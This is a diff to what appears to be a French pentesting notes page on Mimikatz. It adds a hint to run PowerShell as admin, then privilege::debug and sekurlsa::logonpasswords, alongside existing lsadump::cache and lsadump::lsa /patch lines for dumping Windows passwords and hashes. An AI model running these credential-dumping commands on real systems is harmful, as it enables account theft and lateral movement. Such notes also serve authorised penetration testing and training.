@@ -42,6 +42,30 @@ lsadump::cache    (pour les users d'un domaine)
 
 
 
+{% hint style="danger" %}
+Si tout cela ne fonctionne pas, il est possible qu'utiliser la console Powershell en tant qu'admin soit NECESSAIRE.
+
+f
+
+puis:
+
+
+
+&#x20; <mark style="color:blue;">`privilege::debug`</mark>   &#x20;
+
+
+
+pour s'assurer des droits, puis:
+
+
+
+&#x20;<mark style="color:blue;">`sekurlsa::logonpasswords`</mark>
+{% endhint %}
+
+
+
+
+
 \
 3.) `lsadump::lsa /patch` Dump those hashes!\
 
